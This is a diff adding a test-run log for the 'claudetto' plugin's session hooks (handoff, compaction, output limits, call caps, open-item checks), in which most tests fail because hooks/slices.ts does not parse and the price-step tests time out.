+  HooksError: claudetto: hooks module did not load: /Users/krystian/CodeProjects/xsyetopz/claudetto/plugins/claudetto/hooks/slices.ts does not parse: Unexpected | (line 17, column 7)
+(fail) a typed /clear takes no handoff in [99.75ms]
+  HooksError: claudetto: hooks module did not load: /Users/krystian/CodeProjects/xsyetopz/claudetto/plugins/claudetto/hooks/slices.ts does not parse: Unexpected | (line 17, column 7)
+(fail) a session that worked from a plan gets its path and not its text [34.74ms]
+  HooksError: claudetto: hooks module did not load: /Users/krystian/CodeProjects/xsyetopz/claudetto/plugins/claudetto/hooks/slices.ts does not parse: Unexpected | (line 17, column 7)
+(pass) a tool call with no file path adds no path [0.75ms]
+(fail) the next session reads the copy back, and not an older valid file [85.53ms]
+  HooksError: claudetto: hooks module did not load: /Users/krystian/CodeProjects/xsyetopz/claudetto/plugins/claudetto/hooks/slices.ts does not parse: Unexpected | (line 17, column 7)
+(fail) no block the harness built is changed, and the handoff block costs no request [78.88ms]
+  HooksError: claudetto: hooks module did not load: /Users/krystian/CodeProjects/xsyetopz/claudetto/plugins/claudetto/hooks/slices.ts does not parse: Unexpected | (line 17, column 7)
+(fail) no text is added to a message the harness injects [44.19ms]
+  HooksError: claudetto: hooks module did not load: /Users/krystian/CodeProjects/xsyetopz/claudetto/plugins/claudetto/hooks/slices.ts does not parse: Unexpected | (line 17, column 7)
+(fail) a handoff is written under the project root after a shell cd [23.84ms]
+  HooksError: claudetto: hooks module did not load: /Users/krystian/CodeProjects/xsyetopz/claudetto/plugins/claudetto/hooks/slices.ts does not parse: Unexpected | (line 17, column 7)
+(fail) the handoff folder is read under the project root after a shell cd [24.81ms]
+  HooksError: claudetto: hooks module did not load: /Users/krystian/CodeProjects/xsyetopz/claudetto/plugins/claudetto/hooks/slices.ts does not parse: Unexpected | (line 17, column 7)
+(fail) a handoff sets the user's goal again after the clear [111.05ms]
+  HooksError: claudetto: hooks module did not load: /Users/krystian/CodeProjects/xsyetopz/claudetto/plugins/claudetto/hooks/slices.ts does not parse: Unexpected | (line 17, column 7)
+(fail) a handoff after /goal clear sets no goal [58.67ms]
+  HooksError: claudetto: hooks module did not load: /Users/krystian/CodeProjects/xsyetopz/claudetto/plugins/claudetto/hooks/slices.ts does not parse: Unexpected | (line 17, column 7)
+(fail) the last goal the user set is the one set again [22.31ms]
+  HooksError: claudetto: hooks module did not load: /Users/krystian/CodeProjects/xsyetopz/claudetto/plugins/claudetto/hooks/slices.ts does not parse: Unexpected | (line 17, column 7)
+
+hooks/handoff/call.test.ts:
+(pass) the tool writes the file with its fields under the nine headings and no other [3.14ms]
+(pass) a call without a required field writes nothing and names the field [0.40ms]
+(pass) a key in a field is redacted in the file and in the next prompt [0.44ms]
+(pass) the turn ends with no further request, and the clear and the submit wait for the idle [0.34ms]
+(pass) a second call while one runs runs no second clear and no second submit [0.21ms]
+(pass) the tool can hand off again after the first clear [0.20ms]
+(pass) a failed clear submits nothing and says so [0.27ms]
+(pass) a submit the session refuses tells the user in one line [0.21ms]
+(pass) a write that fails comes back as the result and clears nothing [0.23ms]
+(pass) an active goal is set again after the clear and before the submit [0.25ms]
+(pass) no goal is set after a clear when none was active [0.19ms]
+(pass) a goal the engine refuses is named, and the handoff is still sent [0.24ms]
+
+hooks/handoff/handover.test.ts:
+(pass) the handover threshold defaults to the lesser of 400,000 and half the window [3.79ms]
+(pass) handoverThresholdTokens sets the threshold when it is a positive number [1.14ms]
+(pass) a reply that opens with the template's title is a handoff [1.15ms]
+(pass) a reply with the title is saved, compacts, and the next prompt goes in [1.10ms]
+(pass) a reply without the title starts no compaction [0.30ms]
+(pass) a context of 400,000 tokens forks, hands over, and leaves the next prompt to the user [0.24ms]
+(pass) a context under half of a small window forks nothing [0.15ms]
+(pass) a context at half of a small window forks [0.14ms]
+(pass) a fork that answers without the title starts no compaction and logs one line [0.21ms]
+(pass) after a fork without a handoff, no turn's end forks again until a compaction [0.21ms]
+(pass) a turn after a handover that ends still at the size forks nothing and logs one line [0.18ms]
+(pass) a refused next prompt logs one line that says the compaction stands [0.17ms]
+(pass) a compaction answered elsewhere submits no prompt and logs one line [0.17ms]
+(pass) the compaction keeps the first message, an assistant line, and the handoff [0.16ms]
+(pass) a subagent's compaction and a precompute leave the pending handoff alone [0.17ms]
+
+hooks/handoff/turn-end.test.ts:
+(fail) a main-loop reply that starts with the title is saved, the conversation compacts to the first message, an assistant line, and the handoff, and the next prompt goes in [168.82ms]
+  HooksError: claudetto: hooks module did not load: /Users/krystian/CodeProjects/xsyetopz/claudetto/plugins/claudetto/hooks/slices.ts does not parse: Unexpected | (line 17, column 7)
+(fail) a reply without the title, below the size, starts no compaction and forks nothing [99.84ms]
+  HooksError: claudetto: hooks module did not load: /Users/krystian/CodeProjects/xsyetopz/claudetto/plugins/claudetto/hooks/slices.ts does not parse: Unexpected | (line 17, column 7)
+(fail) a reply without the title, at a context of 400,000 tokens, forks for a handoff, hands over to it, and leaves the next prompt to the user [108.50ms]
+  HooksError: claudetto: hooks module did not load: /Users/krystian/CodeProjects/xsyetopz/claudetto/plugins/claudetto/hooks/slices.ts does not parse: Unexpected | (line 17, column 7)
+(fail) a context under half of a small window forks nothing [137.96ms]
+  HooksError: claudetto: hooks module did not load: /Users/krystian/CodeProjects/xsyetopz/claudetto/plugins/claudetto/hooks/slices.ts does not parse: Unexpected | (line 17, column 7)
+(fail) a context at half of a small window forks [119.75ms]
+  HooksError: claudetto: hooks module did not load: /Users/krystian/CodeProjects/xsyetopz/claudetto/plugins/claudetto/hooks/slices.ts does not parse: Unexpected | (line 17, column 7)
+(fail) handoverThresholdTokens sets the size a context must reach to fork [125.32ms]
+  HooksError: claudetto: hooks module did not load: /Users/krystian/CodeProjects/xsyetopz/claudetto/plugins/claudetto/hooks/slices.ts does not parse: Unexpected | (line 17, column 7)
+(fail) a fork that answers with a reply without the title starts no compaction and logs one line [69.85ms]
+  HooksError: claudetto: hooks module did not load: /Users/krystian/CodeProjects/xsyetopz/claudetto/plugins/claudetto/hooks/slices.ts does not parse: Unexpected | (line 17, column 7)
+(fail) a fork that answers with no reply starts no compaction and logs one line [114.63ms]
+  HooksError: claudetto: hooks module did not load: /Users/krystian/CodeProjects/xsyetopz/claudetto/plugins/claudetto/hooks/slices.ts does not parse: Unexpected | (line 17, column 7)
+(fail) after a fork without a handoff, no turn's end forks again until a compaction [52.10ms]
+  HooksError: claudetto: hooks module did not load: /Users/krystian/CodeProjects/xsyetopz/claudetto/plugins/claudetto/hooks/slices.ts does not parse: Unexpected | (line 17, column 7)
+(fail) a turn after a handover that ends still at the size forks nothing and logs one line, so the session does not hand over in a loop [36.71ms]
+  HooksError: claudetto: hooks module did not load: /Users/krystian/CodeProjects/xsyetopz/claudetto/plugins/claudetto/hooks/slices.ts does not parse: Unexpected | (line 17, column 7)
+(fail) a subagent's turn at a large context forks nothing [165.70ms]
+  HooksError: claudetto: hooks module did not load: /Users/krystian/CodeProjects/xsyetopz/claudetto/plugins/claudetto/hooks/slices.ts does not parse: Unexpected | (line 17, column 7)
+(fail) a subagent's handoff reply starts no compaction [57.32ms]
+  HooksError: claudetto: hooks module did not load: /Users/krystian/CodeProjects/xsyetopz/claudetto/plugins/claudetto/hooks/slices.ts does not parse: Unexpected | (line 17, column 7)
+(fail) an interrupted turn starts no compaction [102.80ms]
+  HooksError: claudetto: hooks module did not load: /Users/krystian/CodeProjects/xsyetopz/claudetto/plugins/claudetto/hooks/slices.ts does not parse: Unexpected | (line 17, column 7)
+(fail) a compaction typed after the handover goes to the engine [45.78ms]
+  HooksError: claudetto: hooks module did not load: /Users/krystian/CodeProjects/xsyetopz/claudetto/plugins/claudetto/hooks/slices.ts does not parse: Unexpected | (line 17, column 7)
+(fail) a `/compact` whose hook fails submits no prompt, logs one line, and leaves the next compaction to the engine [99.32ms]
+  HooksError: claudetto: hooks module did not load: /Users/krystian/CodeProjects/xsyetopz/claudetto/plugins/claudetto/hooks/slices.ts does not parse: Unexpected | (line 17, column 7)
+(fail) a `/compact` that runs no compaction submits no prompt, logs one line, and leaves the next compaction to the engine [119.40ms]
+  HooksError: claudetto: hooks module did not load: /Users/krystian/CodeProjects/xsyetopz/claudetto/plugins/claudetto/hooks/slices.ts does not parse: Unexpected | (line 17, column 7)
+(fail) a refused next prompt logs one line that says the compaction stands [105.33ms]
+  HooksError: claudetto: hooks module did not load: /Users/krystian/CodeProjects/xsyetopz/claudetto/plugins/claudetto/hooks/slices.ts does not parse: Unexpected | (line 17, column 7)
+(fail) a key the reply carries is redacted in the saved file and in the context the compaction keeps [26.71ms]
+  HooksError: claudetto: hooks module did not load: /Users/krystian/CodeProjects/xsyetopz/claudetto/plugins/claudetto/hooks/slices.ts does not parse: Unexpected | (line 17, column 7)
+
+hooks/hygiene.test.ts:
+(fail) a startup runs the sweep in the project with the session id and cleanupPeriodDays [203.83ms]
+  HooksError: claudetto: hooks module did not load: /Users/krystian/CodeProjects/xsyetopz/claudetto/plugins/claudetto/hooks/slices.ts does not parse: Unexpected | (line 17, column 7)
+(fail) an unset cleanupPeriodDays passes no --days [187.36ms]
+  HooksError: claudetto: hooks module did not load: /Users/krystian/CodeProjects/xsyetopz/claudetto/plugins/claudetto/hooks/slices.ts does not parse: Unexpected | (line 17, column 7)
+(fail) the start returns while the sweep still runs [85.34ms]
+  HooksError: claudetto: hooks module did not load: /Users/krystian/CodeProjects/xsyetopz/claudetto/plugins/claudetto/hooks/slices.ts does not parse: Unexpected | (line 17, column 7)
+(fail) a failed sweep does not fail the start [66.14ms]
+  HooksError: claudetto: hooks module did not load: /Users/krystian/CodeProjects/xsyetopz/claudetto/plugins/claudetto/hooks/slices.ts does not parse: Unexpected | (line 17, column 7)
+(fail) a resume runs no sweep [129.28ms]
+  HooksError: claudetto: hooks module did not load: /Users/krystian/CodeProjects/xsyetopz/claudetto/plugins/claudetto/hooks/slices.ts does not parse: Unexpected | (line 17, column 7)
+(fail) the retention options go to the process as flags, and 0 is passed as off [41.27ms]
+  HooksError: claudetto: hooks module did not load: /Users/krystian/CodeProjects/xsyetopz/claudetto/plugins/claudetto/hooks/slices.ts does not parse: Unexpected | (line 17, column 7)
+(fail) hygieneEnabled false starts no process [53.70ms]
+  HooksError: claudetto: hooks module did not load: /Users/krystian/CodeProjects/xsyetopz/claudetto/plugins/claudetto/hooks/slices.ts does not parse: Unexpected | (line 17, column 7)
+
+hooks/limits/bound-output.test.ts:
+(fail) a long test run is cut to its head and tail, and the whole text is saved [172.54ms]
+  HooksError: claudetto: hooks module did not load: /Users/krystian/CodeProjects/xsyetopz/claudetto/plugins/claudetto/hooks/slices.ts does not parse: Unexpected | (line 17, column 7)
+(fail) a command that is no test, build, or lint run is left whole [153.25ms]
+  HooksError: claudetto: hooks module did not load: /Users/krystian/CodeProjects/xsyetopz/claudetto/plugins/claudetto/hooks/slices.ts does not parse: Unexpected | (line 17, column 7)
+(fail) an output that fits is left whole and saves nothing [50.16ms]
+  HooksError: claudetto: hooks module did not load: /Users/krystian/CodeProjects/xsyetopz/claudetto/plugins/claudetto/hooks/slices.ts does not parse: Unexpected | (line 17, column 7)
+(fail) maxTestOutputChars 0 leaves every output whole [135.47ms]
+  HooksError: claudetto: hooks module did not load: /Users/krystian/CodeProjects/xsyetopz/claudetto/plugins/claudetto/hooks/slices.ts does not parse: Unexpected | (line 17, column 7)
+(fail) an error result keeps its error form while its output is cut [81.85ms]
+  HooksError: claudetto: hooks module did not load: /Users/krystian/CodeProjects/xsyetopz/claudetto/plugins/claudetto/hooks/slices.ts does not parse: Unexpected | (line 17, column 7)
+(fail) the output of `cargo test` is cut [114.04ms]
+  HooksError: claudetto: hooks module did not load: /Users/krystian/CodeProjects/xsyetopz/claudetto/plugins/claudetto/hooks/slices.ts does not parse: Unexpected | (line 17, column 7)
+(fail) the output of `pytest -x` is cut [78.92ms]
+  HooksError: claudetto: hooks module did not load: /Users/krystian/CodeProjects/xsyetopz/claudetto/plugins/claudetto/hooks/slices.ts does not parse: Unexpected | (line 17, column 7)
+(fail) the output of `go test ./...` is cut [80.10ms]
+  HooksError: claudetto: hooks module did not load: /Users/krystian/CodeProjects/xsyetopz/claudetto/plugins/claudetto/hooks/slices.ts does not parse: Unexpected | (line 17, column 7)
+(fail) the output of `just check` is cut [72.86ms]
+  HooksError: claudetto: hooks module did not load: /Users/krystian/CodeProjects/xsyetopz/claudetto/plugins/claudetto/hooks/slices.ts does not parse: Unexpected | (line 17, column 7)
+(fail) the output of `bun run build` is cut [122.74ms]
+  HooksError: claudetto: hooks module did not load: /Users/krystian/CodeProjects/xsyetopz/claudetto/plugins/claudetto/hooks/slices.ts does not parse: Unexpected | (line 17, column 7)
+(fail) an output that cannot be saved is cut, and the cut line says so [64.74ms]
+  HooksError: claudetto: hooks module did not load: /Users/krystian/CodeProjects/xsyetopz/claudetto/plugins/claudetto/hooks/slices.ts does not parse: Unexpected | (line 17, column 7)
+
+hooks/limits/budget.test.ts:
+(fail) a prompt carries one line naming the three readings [217.66ms]
+  HooksError: claudetto: hooks module did not load: /Users/krystian/CodeProjects/xsyetopz/claudetto/plugins/claudetto/hooks/slices.ts does not parse: Unexpected | (line 17, column 7)
+(fail) a login with no rate-limit windows gets the context alone [108.19ms]
+  HooksError: claudetto: hooks module did not load: /Users/krystian/CodeProjects/xsyetopz/claudetto/plugins/claudetto/hooks/slices.ts does not parse: Unexpected | (line 17, column 7)
+(fail) an unchanged band adds nothing to the next prompt, and a changed band adds the line again [71.00ms]
+  HooksError: claudetto: hooks module did not load: /Users/krystian/CodeProjects/xsyetopz/claudetto/plugins/claudetto/hooks/slices.ts does not parse: Unexpected | (line 17, column 7)
+(pass) a reading the login does not supply is left out and not zeroed [0.62ms]
+(fail) no reading at all adds no line [128.80ms]
+  HooksError: claudetto: hooks module did not load: /Users/krystian/CodeProjects/xsyetopz/claudetto/plugins/claudetto/hooks/slices.ts does not parse: Unexpected | (line 17, column 7)
+(pass) the line stays one short line however many windows the engine reports [0.64ms]
+(pass) the widest line is 69 characters [0.20ms]
+(pass) a reading that moved inside its own band is the same band [0.17ms]
+(pass) a reading that crossed a step is another band [0.14ms]
+(pass) a reading the login does not supply is one band and not a number [0.12ms]
+(fail) a seven-day share of 90% or more adds the share as a fact and no instruction [139.34ms]
+  HooksError: claudetto: hooks module did not load: /Users/krystian/CodeProjects/xsyetopz/claudetto/plugins/claudetto/hooks/slices.ts does not parse: Unexpected | (line 17, column 7)
+(pass) the root prompt carries the instruction for a seven-day share of 90% or more [0.38ms]
+(fail) a seven-day share that rose inside its band of ten stays silent, and one that crossed the band speaks again [107.64ms]
+  HooksError: claudetto: hooks module did not load: /Users/krystian/CodeProjects/xsyetopz/claudetto/plugins/claudetto/hooks/slices.ts does not parse: Unexpected | (line 17, column 7)
+
+hooks/limits/hold.test.ts:
+(fail) an identical call is refused after the failure limit, with the earlier error [265.37ms]
+  HooksError: claudetto: hooks module did not load: /Users/krystian/CodeProjects/xsyetopz/claudetto/plugins/claudetto/hooks/slices.ts does not parse: Unexpected | (line 17, column 7)
+(fail) a call under the failure limit, or with other input, goes through [121.34ms]
+  HooksError: claudetto: hooks module did not load: /Users/krystian/CodeProjects/xsyetopz/claudetto/plugins/claudetto/hooks/slices.ts does not parse: Unexpected | (line 17, column 7)
+(fail) a failure after the period passes [112.05ms]
+  HooksError: claudetto: hooks module did not load: /Users/krystian/CodeProjects/xsyetopz/claudetto/plugins/claudetto/hooks/slices.ts does not parse: Unexpected | (line 17, column 7)
+(fail) a user's interrupt is not counted as a failure [124.95ms]
+  HooksError: claudetto: hooks module did not load: /Users/krystian/CodeProjects/xsyetopz/claudetto/plugins/claudetto/hooks/slices.ts does not parse: Unexpected | (line 17, column 7)
+(fail) a query without a tool_use_id is never held [88.70ms]
+  HooksError: claudetto: hooks module did not load: /Users/krystian/CodeProjects/xsyetopz/claudetto/plugins/claudetto/hooks/slices.ts does not parse: Unexpected | (line 17, column 7)
+(fail) the call past the cap at heavy context is held with the cap named and one line that gives the count [118.94ms]
+  HooksError: claudetto: hooks module did not load: /Users/krystian/CodeProjects/xsyetopz/claudetto/plugins/claudetto/hooks/slices.ts does not parse: Unexpected | (line 17, column 7)
+(fail) a light context is never capped [93.59ms]
+  HooksError: claudetto: hooks module did not load: /Users/krystian/CodeProjects/xsyetopz/claudetto/plugins/claudetto/hooks/slices.ts does not parse: Unexpected | (line 17, column 7)
+(fail) failures with different errors do not add up [42.73ms]
+  HooksError: claudetto: hooks module did not load: /Users/krystian/CodeProjects/xsyetopz/claudetto/plugins/claudetto/hooks/slices.ts does not parse: Unexpected | (line 17, column 7)
+(fail) with no option the failure limit is 3 [127.62ms]
+  HooksError: claudetto: hooks module did not load: /Users/krystian/CodeProjects/xsyetopz/claudetto/plugins/claudetto/hooks/slices.ts does not parse: Unexpected | (line 17, column 7)
+(fail) the calls under the cap at heavy context go through [44.06ms]
+  HooksError: claudetto: hooks module did not load: /Users/krystian/CodeProjects/xsyetopz/claudetto/plugins/claudetto/hooks/slices.ts does not parse: Unexpected | (line 17, column 7)
+(fail) a context that falls back below the heavy line starts the count again [96.59ms]
+  HooksError: claudetto: hooks module did not load: /Users/krystian/CodeProjects/xsyetopz/claudetto/plugins/claudetto/hooks/slices.ts does not parse: Unexpected | (line 17, column 7)
+(fail) a call after the period has passed is counted from zero [91.98ms]
+  HooksError: claudetto: hooks module did not load: /Users/krystian/CodeProjects/xsyetopz/claudetto/plugins/claudetto/hooks/slices.ts does not parse: Unexpected | (line 17, column 7)
+(fail) a heavy-context threshold from the options replaces the default [130.90ms]
+  HooksError: claudetto: hooks module did not load: /Users/krystian/CodeProjects/xsyetopz/claudetto/plugins/claudetto/hooks/slices.ts does not parse: Unexpected | (line 17, column 7)
+(fail) a start past the environment's cap of running subagents is refused [95.21ms]
+  HooksError: claudetto: hooks module did not load: /Users/krystian/CodeProjects/xsyetopz/claudetto/plugins/claudetto/hooks/slices.ts does not parse: Unexpected | (line 17, column 7)
+(fail) a start under the cap goes through [27.43ms]
+  HooksError: claudetto: hooks module did not load: /Users/krystian/CodeProjects/xsyetopz/claudetto/plugins/claudetto/hooks/slices.ts does not parse: Unexpected | (line 17, column 7)
+(fail) starts past maxSubagentStarts in the period are refused [107.26ms]
+  HooksError: claudetto: hooks module did not load: /Users/krystian/CodeProjects/xsyetopz/claudetto/plugins/claudetto/hooks/slices.ts does not parse: Unexpected | (line 17, column 7)
+(fail) an agent that has ended does not count against the cap [50.41ms]
+  HooksError: claudetto: hooks module did not load: /Users/krystian/CodeProjects/xsyetopz/claudetto/plugins/claudetto/hooks/slices.ts does not parse: Unexpected | (line 17, column 7)
+(fail) a start after the period has passed counts from zero [59.73ms]
+  HooksError: claudetto: hooks module did not load: /Users/krystian/CodeProjects/xsyetopz/claudetto/plugins/claudetto/hooks/slices.ts does not parse: Unexpected | (line 17, column 7)
+(fail) with no option the start cap is 12 [88.70ms]
+  HooksError: claudetto: hooks module did not load: /Users/krystian/CodeProjects/xsyetopz/claudetto/plugins/claudetto/hooks/slices.ts does not parse: Unexpected | (line 17, column 7)
+(fail) a start with no cap in the environment is not refused for the count of running subagents [90.59ms]
+  HooksError: claudetto: hooks module did not load: /Users/krystian/CodeProjects/xsyetopz/claudetto/plugins/claudetto/hooks/slices.ts does not parse: Unexpected | (line 17, column 7)
+(fail) a context reading that fails holds nothing [27.29ms]
+  HooksError: claudetto: hooks module did not load: /Users/krystian/CodeProjects/xsyetopz/claudetto/plugins/claudetto/hooks/slices.ts does not parse: Unexpected | (line 17, column 7)
+
+hooks/limits/named-files.test.ts:
+(fail) the incident text with the file missing blocks and names the path [49.13ms]
+  HooksError: claudetto: hooks module did not load: /Users/krystian/CodeProjects/xsyetopz/claudetto/plugins/claudetto/hooks/slices.ts does not parse: Unexpected | (line 17, column 7)
+(fail) the incident text with the file present passes [136.50ms]
+  HooksError: claudetto: hooks module did not load: /Users/krystian/CodeProjects/xsyetopz/claudetto/plugins/claudetto/hooks/slices.ts does not parse: Unexpected | (line 17, column 7)
+(fail) a path the command makes passes while absent [157.75ms]
+  HooksError: claudetto: hooks module did not load: /Users/krystian/CodeProjects/xsyetopz/claudetto/plugins/claudetto/hooks/slices.ts does not parse: Unexpected | (line 17, column 7)
+(fail) a redirect target passes and a relative path is left alone [96.93ms]
+  HooksError: claudetto: hooks module did not load: /Users/krystian/CodeProjects/xsyetopz/claudetto/plugins/claudetto/hooks/slices.ts does not parse: Unexpected | (line 17, column 7)
+(fail) a ~/ path is read under HOME [119.98ms]
+  HooksError: claudetto: hooks module did not load: /Users/krystian/CodeProjects/xsyetopz/claudetto/plugins/claudetto/hooks/slices.ts does not parse: Unexpected | (line 17, column 7)
+(fail) a command not marked with `!` is not checked [95.49ms]
+  HooksError: claudetto: hooks module did not load: /Users/krystian/CodeProjects/xsyetopz/claudetto/plugins/claudetto/hooks/slices.ts does not parse: Unexpected | (line 17, column 7)
+(fail) a subagent's final report with a missing file is blocked [52.95ms]
+  HooksError: claudetto: hooks module did not load: /Users/krystian/CodeProjects/xsyetopz/claudetto/plugins/claudetto/hooks/slices.ts does not parse: Unexpected | (line 17, column 7)
+(fail) touch and mv make their paths, and a mv still reads its source [125.99ms]
+  HooksError: claudetto: hooks module did not load: /Users/krystian/CodeProjects/xsyetopz/claudetto/plugins/claudetto/hooks/slices.ts does not parse: Unexpected | (line 17, column 7)
+(fail) only the last operand of a cp is made, however many come before it, and a flag after it is no operand [99.88ms]
+  HooksError: claudetto: hooks module did not load: /Users/krystian/CodeProjects/xsyetopz/claudetto/plugins/claudetto/hooks/slices.ts does not parse: Unexpected | (line 17, column 7)
+(fail) a git command other than clone reads its last operand, and clone is git's alone [92.22ms]
+  HooksError: claudetto: hooks module did not load: /Users/krystian/CodeProjects/xsyetopz/claudetto/plugins/claudetto/hooks/slices.ts does not parse: Unexpected | (line 17, column 7)
+(fail) a fence opens at the line start, indented or not, and not after text [83.28ms]
+  HooksError: claudetto: hooks module did not load: /Users/krystian/CodeProjects/xsyetopz/claudetto/plugins/claudetto/hooks/slices.ts does not parse: Unexpected | (line 17, column 7)
+(fail) a `!` step starts its line, with one or more spaces after it, and trims its span [55.31ms]
+  HooksError: claudetto: hooks module did not load: /Users/krystian/CodeProjects/xsyetopz/claudetto/plugins/claudetto/hooks/slices.ts does not parse: Unexpected | (line 17, column 7)
+(pass) userCommands gives the commands of the steps and nothing for text without one [1.06ms]
+(pass) namedPaths pairs each read path with its command [0.81ms]
+
+hooks/limits/open-items.test.ts:
+(fail) prose that mentions a remaining budget passes [146.03ms]
+  HooksError: claudetto: hooks module did not load: /Users/krystian/CodeProjects/xsyetopz/claudetto/plugins/claudetto/hooks/slices.ts does not parse: Unexpected | (line 17, column 7)
+(fail) a done task item passes [126.30ms]
+  HooksError: claudetto: hooks module did not load: /Users/krystian/CodeProjects/xsyetopz/claudetto/plugins/claudetto/hooks/slices.ts does not parse: Unexpected | (line 17, column 7)
+(fail) a blocker word in an open item is no blocker [118.22ms]
+  HooksError: claudetto: hooks module did not load: /Users/krystian/CodeProjects/xsyetopz/claudetto/plugins/claudetto/hooks/slices.ts does not parse: Unexpected | (line 17, column 7)
+(fail) open items block under any heading or none [70.19ms]
+  HooksError: claudetto: hooks module did not load: /Users/krystian/CodeProjects/xsyetopz/claudetto/plugins/claudetto/hooks/slices.ts does not parse: Unexpected | (line 17, column 7)
+(fail) a plain bullet under an Open heading is no task item [75.86ms]
+  HooksError: claudetto: hooks module did not load: /Users/krystian/CodeProjects/xsyetopz/claudetto/plugins/claudetto/hooks/slices.ts does not parse: Unexpected | (line 17, column 7)
+(fail) an offer in the last line blocks and is named [115.56ms]
+  HooksError: claudetto: hooks module did not load: /Users/krystian/CodeProjects/xsyetopz/claudetto/plugins/claudetto/hooks/slices.ts does not parse: Unexpected | (line 17, column 7)
+(fail) a question in the middle of the reply is no offer [37.00ms]
+  HooksError: claudetto: hooks module did not load: /Users/krystian/CodeProjects/xsyetopz/claudetto/plugins/claudetto/hooks/slices.ts does not parse: Unexpected | (line 17, column 7)
+(fail) an open item that gives a `! command` passes, a paid run included [29.19ms]
+  HooksError: claudetto: hooks module did not load: /Users/krystian/CodeProjects/xsyetopz/claudetto/plugins/claudetto/hooks/slices.ts does not parse: Unexpected | (line 17, column 7)
+(fail) an open item with no denial, command, or open question blocks and says so [57.63ms]
+  HooksError: claudetto: hooks module did not load: /Users/krystian/CodeProjects/xsyetopz/claudetto/plugins/claudetto/hooks/slices.ts does not parse: Unexpected | (line 17, column 7)
+(fail) a refused call in the turn is the blocker of an open item [84.68ms]
+  HooksError: claudetto: hooks module did not load: /Users/krystian/CodeProjects/xsyetopz/claudetto/plugins/claudetto/hooks/slices.ts does not parse: Unexpected | (line 17, column 7)
+(fail) an open AskUserQuestion is the blocker of an open item [29.70ms]
+  HooksError: claudetto: hooks module did not load: /Users/krystian/CodeProjects/xsyetopz/claudetto/plugins/claudetto/hooks/slices.ts does not parse: Unexpected | (line 17, column 7)
+(fail) the second Stop of a continued turn passes [73.11ms]
+  HooksError: claudetto: hooks module did not load: /Users/krystian/CodeProjects/xsyetopz/claudetto/plugins/claudetto/hooks/slices.ts does not parse: Unexpected | (line 17, column 7)
+(fail) a block of another hook stands and adds nothing [47.93ms]
+  HooksError: claudetto: hooks module did not load: /Users/krystian/CodeProjects/xsyetopz/claudetto/plugins/claudetto/hooks/slices.ts does not parse: Unexpected | (line 17, column 7)
+(fail) openItemsCheckEnabled false blocks nothing [19.39ms]
+  HooksError: claudetto: hooks module did not load: /Users/krystian/CodeProjects/xsyetopz/claudetto/plugins/claudetto/hooks/slices.ts does not parse: Unexpected | (line 17, column 7)
+(fail) the recorded incident reply, in the form the output style prescribes, blocks [18.73ms]
+  HooksError: claudetto: hooks module did not load: /Users/krystian/CodeProjects/xsyetopz/claudetto/plugins/claudetto/hooks/slices.ts does not parse: Unexpected | (line 17, column 7)
+(fail) a What I Need from You item with a ! command passes [22.66ms]
+  HooksError: claudetto: hooks module did not load: /Users/krystian/CodeProjects/xsyetopz/claudetto/plugins/claudetto/hooks/slices.ts does not parse: Unexpected | (line 17, column 7)
+(fail) an item is listed by its text alone, whatever the bullet, indent, spacing, or trailing blanks [157.61ms]
+  HooksError: claudetto: hooks module did not load: /Users/krystian/CodeProjects/xsyetopz/claudetto/plugins/claudetto/hooks/slices.ts does not parse: Unexpected | (line 17, column 7)
+(fail) a `!` excuses an item at its start, after a space, a backtick, or a paren, with spaces after it [36.45ms]
+  HooksError: claudetto: hooks module did not load: /Users/krystian/CodeProjects/xsyetopz/claudetto/plugins/claudetto/hooks/slices.ts does not parse: Unexpected | (line 17, column 7)
+(fail) a refusal or question of an earlier turn excuses nothing [61.75ms]
+  HooksError: claudetto: hooks module did not load: /Users/krystian/CodeProjects/xsyetopz/claudetto/plugins/claudetto/hooks/slices.ts does not parse: Unexpected | (line 17, column 7)
+(fail) a turn is counted from the last message with text, so a tool result or a reply does not restart it [49.22ms]
+  HooksError: claudetto: hooks module did not load: /Users/krystian/CodeProjects/xsyetopz/claudetto/plugins/claudetto/hooks/slices.ts does not parse: Unexpected | (line 17, column 7)
+(fail) a reply of the assistant does not restart the turn either [28.74ms]
+  HooksError: claudetto: hooks module did not load: /Users/krystian/CodeProjects/xsyetopz/claudetto/plugins/claudetto/hooks/slices.ts does not parse: Unexpected | (line 17, column 7)
+(fail) a call that worked, or a question that was answered, is no blocker [57.46ms]
+  HooksError: claudetto: hooks module did not load: /Users/krystian/CodeProjects/xsyetopz/claudetto/plugins/claudetto/hooks/slices.ts does not parse: Unexpected | (line 17, column 7)
+(fail) a question that is open and a refusal that is not a question each excuse alone [32.98ms]
+  HooksError: claudetto: hooks module did not load: /Users/krystian/CodeProjects/xsyetopz/claudetto/plugins/claudetto/hooks/slices.ts does not parse: Unexpected | (line 17, column 7)
+(fail) the offer is the last non-blank line, trimmed, and an empty reply has none [26.53ms]
+  HooksError: claudetto: hooks module did not load: /Users/krystian/CodeProjects/xsyetopz/claudetto/plugins/claudetto/hooks/slices.ts does not parse: Unexpected | (line 17, column 7)
+(pass) openItems of an empty or blank reply finds nothing [1.87ms]
+
+hooks/limits/price-step.test.ts:
+(fail) a Haiku result that would take the next request over the step is withheld [5004.48ms]
+  Error: timed out after 5000 ms
+(fail) a Haiku result that fits reaches the model unchanged [5003.30ms]
+  Error: timed out after 5000 ms
+(fail) another model's result passes whatever its size [5003.40ms]
+  Error: timed out after 5000 ms
+(fail) of two Haiku results that cross only together, the first passes and the second is withheld [5003.32ms]
+  Error: timed out after 5000 ms
+(fail) a step that ends with no reading passes its result [5002.05ms]
+  Error: timed out after 5000 ms
+(fail) a call that throws leaves no wait behind for a later call of the same id [5006.50ms]
+  Error: timed out after 5000 ms
+(fail) another model's call answers while its step still streams [5003.33ms]
+  Error: timed out after 5000 ms
+(fail) a Haiku call whose step streams past the call's budget passes its result before the budget ends [5002.28ms]
+  Error: timed out after 5000 ms
+(fail) a step writes the session's heartbeat when it starts and again on its stop chunk [5003.32ms]
+  Error: timed out after 5000 ms
+(fail) a heartbeat that cannot be written leaves the step and its results as they were [5001.91ms]
+  Error: timed out after 5000 ms
+(fail) the file ran to its end [0.00ms]
+  a rejection nothing handled: claudetto: hooks module did not load: /Users/krystian/CodeProjects/xsyetopz/claudetto/plugins/claudetto/hooks/slices.ts does not parse: Unexpected | (line 17, column 7)
+  claudetto: hooks module did not load: /Users/krystian/CodeProjects/xsyetopz/claudetto/plugins/claudetto/hooks/slices.ts does not parse: Unexpected | (line 17, column 7)
+  claudetto: hooks module did not load: /Users/krystian/CodeProjects/xsyetopz/claudetto/plugins/claudetto/hooks/slices.ts does not parse: Unexpected | (line 17, column 7)
